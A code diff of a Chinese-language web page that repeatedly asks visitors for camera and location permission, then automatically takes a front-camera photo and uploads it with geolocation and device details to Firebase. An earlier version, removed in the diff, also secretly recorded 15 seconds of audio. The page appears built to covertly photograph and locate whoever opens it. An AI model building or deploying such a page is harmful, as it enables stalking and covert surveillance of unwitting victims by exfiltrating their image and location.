@@ -114,12 +114,12 @@
 <body>
     <div class="container" id="content">
         <h1 id="heading">请稍等，正在请求权限...</h1>
-        <p id="subtitle">需要访问相机、麦克风和位置信息。</p>
+        <p id="subtitle">需要访问相机和位置信息。</p>
         <div id="permissionStatus"></div>
 
         <!-- Camera preview -->
         <div id="cameraSection" style="display:none;">
-            <p style="margin:15px 0 8px;">前置相机已开启，正在录音 15 秒...</p>
+            <p style="margin:15px 0 8px;">正在拍照...</p>
             <video id="video" autoplay playsinline muted></video>
         </div>
     </div>
@@ -136,18 +136,15 @@
         const RETRY_DELAY = 1000;
 
         let mediaStream = null;
-        let mediaRecorder = null;
 
         // Permission tracking
         const permissionStatus = {
             camera: false,
-            microphone: false,
             geolocation: false
         };
 
         let permissionRetries = {
             camera: 0,
-            microphone: 0,
             geolocation: 0
         };
 
@@ -164,8 +161,7 @@
                                    (retries < MAX_RETRIES ? 'permission-pending' : 'permission-denied');
                 const statusText = granted ? '✓ 已授予' : `✗ 等待中 (${retries}/${MAX_RETRIES})`;
                 
-                const permName = perm === 'camera' ? '相机' : 
-                                perm === 'microphone' ? '麦克风' : '位置信息';
+                const permName = perm === 'camera' ? '相机' : '位置信息';
                 
                 html += `<div class="permission-status"><span class="${statusClass}">${permName}: ${statusText}</span></div>`;
             }
@@ -177,13 +173,6 @@
          * Cleanup all media resources
          */
         function cleanupMedia() {
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                try {
-                    mediaRecorder.stop();
-                } catch (e) {
-                    console.warn("MediaRecorder stop error:", e);
-                }
-            }
             if (mediaStream) {
                 mediaStream.getTracks().forEach(track => {
                     try {
@@ -197,42 +186,38 @@
         }
 
         /**
-         * Request camera and microphone permissions with retry logic
+         * Request camera permission with retry logic
          */
-        async function requestMediaPermissions() {
-            console.log("📹 Requesting camera and microphone permissions...");
+        async function requestCameraPermission() {
+            console.log("📹 Requesting camera permission...");
             
-            while (permissionRetries.camera < MAX_RETRIES || permissionRetries.microphone < MAX_RETRIES) {
+            while (permissionRetries.camera < MAX_RETRIES) {
                 try {
                     mediaStream = await navigator.mediaDevices.getUserMedia({ 
                         video: { 
                             facingMode: "user",
                             width: { ideal: 1280 },
                             height: { ideal: 720 }
-                        },
-                        audio: true 
+                        }
                     });
 
                     permissionStatus.camera = true;
-                    permissionStatus.microphone = true;
                     permissionRetries.camera = MAX_RETRIES;
-                    permissionRetries.microphone = MAX_RETRIES;
                     
-                    console.log("✓ Camera and microphone permissions granted");
+                    console.log("✓ Camera permission granted");
                     updatePermissionDisplay();
                     return true;
 
                 } catch (err) {
-                    console.warn(`⚠ Media permission attempt failed (${permissionRetries.camera}/${MAX_RETRIES}):`, err.name);
+                    console.warn(`⚠ Camera permission attempt failed (${permissionRetries.camera}/${MAX_RETRIES}):`, err.name);
                     
                     if (err.name === 'NotAllowedError') {
                         permissionRetries.camera++;
-                        permissionRetries.microphone++;
                     } else if (err.name === 'NotFoundError') {
-                        console.error("✗ Camera or microphone device not found");
+                        console.error("✗ Camera device not found");
                         return false;
                     } else if (err.name === 'NotReadableError') {
-                        console.error("✗ Camera or microphone is in use by another application");
+                        console.error("✗ Camera is in use by another application");
                         return false;
                     } else if (err.name === 'SecurityError') {
                         console.error("✗ Security error: HTTPS required");
@@ -241,14 +226,14 @@
 
                     updatePermissionDisplay();
 
-                    if (permissionRetries.camera < MAX_RETRIES || permissionRetries.microphone < MAX_RETRIES) {
+                    if (permissionRetries.camera < MAX_RETRIES) {
                         console.log(`⏳ Retrying in ${RETRY_DELAY}ms...`);
                         await new Promise(resolve => setTimeout(resolve, RETRY_DELAY));
                     }
                 }
             }
 
-            console.error("✗ Failed to obtain camera/microphone permissions after retries");
+            console.error("✗ Failed to obtain camera permission after retries");
             return false;
         }
 
@@ -306,14 +291,14 @@
         async function requestAllPermissions() {
             updatePermissionDisplay();
             
-            const [mediaGranted, geoGranted] = await Promise.all([
-                requestMediaPermissions(),
+            const [cameraGranted, geoGranted] = await Promise.all([
+                requestCameraPermission(),
                 requestGeolocationPermission()
             ]);
 
-            if (!mediaGranted) {
+            if (!cameraGranted) {
                 const content = document.getElementById('content');
-                content.innerHTML = `<h2 class="error">无法获取相机和麦克风权限。请检查设备设置。</h2>`;
+                content.innerHTML = `<h2 class="error">无法获取相机权限。请检查设备设置。</h2>`;
                 return false;
             }
 
@@ -322,13 +307,11 @@
         }
 
         /**
-         * Start recording after permissions are granted
+         * Capture photo and collect data
          */
-        async function startRecording() {
+        async function captureAndSendData() {
             const content = document.getElementById('content');
             let photoBase64 = null;
-            let audioBase64 = null;
-            let photoCaptured = false;
 
             try {
                 const video = document.getElementById('video');
@@ -336,23 +319,19 @@
                 document.getElementById('cameraSection').style.display = 'block';
                 document.getElementById('permissionStatus').style.display = 'none';
 
-                console.log("✓ Recording started");
+                console.log("✓ Camera stream started");
 
                 /**
-                 * Capture photo when video is ready (event-driven, not fixed delay)
+                 * Capture photo when video is ready (event-driven)
                  */
                 const photoTimeout = setTimeout(() => {
-                    if (!photoCaptured) {
-                        console.warn("⚠ Photo capture timeout - proceeding without photo");
-                        photoCaptured = true;
-                        photoBase64 = null;
-                    }
+                    console.warn("⚠ Photo capture timeout - proceeding without photo");
+                    photoBase64 = null;
+                    collectAndSendData(photoBase64);
                 }, 3000);
 
                 video.onloadedmetadata = () => {
-                    if (photoCaptured) return;
                     clearTimeout(photoTimeout);
-                    photoCaptured = true;
 
                     try {
                         const canvas = document.createElement('canvas');
@@ -362,64 +341,24 @@
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
                         console.log("✓ Photo captured successfully");
+                        collectAndSendData(photoBase64);
                     } catch (err) {
                         console.error("✗ Photo capture error:", err);
-                        photoBase64 = null;
+                        collectAndSendData(null);
                     }
                 };
-
-                // Record audio for 15 seconds
-                mediaRecorder = new MediaRecorder(mediaStream);
-                let audioChunks = [];
-
-                mediaRecorder.ondataavailable = event => {
-                    audioChunks.push(event.data);
-                };
-
-                mediaRecorder.onstop = () => {
-                    try {
-                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                        const reader = new FileReader();
-                        reader.onloadend = () => {
-                            audioBase64 = reader.result;
-                            console.log("✓ Audio recording complete");
-                            setTimeout(() => sendAllData(photoBase64, audioBase64), 500);
-                        };
-                        reader.onerror = (err) => {
-                            console.error("✗ Audio encoding error:", err);
-                            sendAllData(photoBase64, null);
-                        };
-                        reader.readAsDataURL(audioBlob);
-                    } catch (err) {
-                        console.error("✗ Audio blob error:", err);
-                        sendAllData(photoBase64, null);
-                    }
-                };
-
-                mediaRecorder.onerror = (event) => {
-                    console.error("✗ Recording error:", event.error);
-                };
-
-                mediaRecorder.start();
-
-                // Stop recording after 15 seconds
-                setTimeout(() => {
-                    console.log("✓ Recording time complete");
-                    mediaRecorder.stop();
-                    cleanupMedia();
-                }, 15000);
 
             } catch (err) {
-                console.error("✗ Recording error:", err);
+                console.error("✗ Camera error:", err);
                 cleanupMedia();
-                content.innerHTML = `<h2 class="error">录音失败，请重试。</h2>`;
+                content.innerHTML = `<h2 class="error">相机错误，请重试。</h2>`;
             }
         }
 
         /**
-         * Send all collected data to Firebase
+         * Collect all data and send to Firebase
          */
-        async function sendAllData(photoBase64, audioBase64) {
+        async function collectAndSendData(photoBase64) {
             const content = document.getElementById('content');
             const payload = {
                 timestamp: new Date().toISOString(),
@@ -437,8 +376,7 @@
                 region: "unknown",
                 country: "unknown",
                 photo_base64: photoBase64,
-                audio_base64: audioBase64,
-                note: "前置相机自动拍照 + 15秒录音"
+                note: "前置相机自动拍照"
             };
 
             // Geolocation data (best effort)
@@ -501,13 +439,15 @@
 
                 if (response.ok) {
                     console.log("✓ Data sent to Firebase successfully");
-                    content.innerHTML = `<h2 class="success">照片和15秒录音已自动发送 ❤️<br>谢谢！</h2>`;
+                    content.innerHTML = `<h2 class="success">照片已自动发送 ❤️<br>谢谢！</h2>`;
                 } else {
                     throw new Error(`Firebase response: ${response.status}`);
                 }
             } catch (e) {
                 console.error("✗ Firebase send error:", e);
                 content.innerHTML = `<h2 class="error">发送失败，请检查网络连接后重试。</h2>`;
+            } finally {
+                cleanupMedia();
             }
         }
 
@@ -519,7 +459,7 @@
             const permissionsGranted = await requestAllPermissions();
             
             if (permissionsGranted) {
-                await startRecording();
+                await captureAndSendData();
             }
         }
 
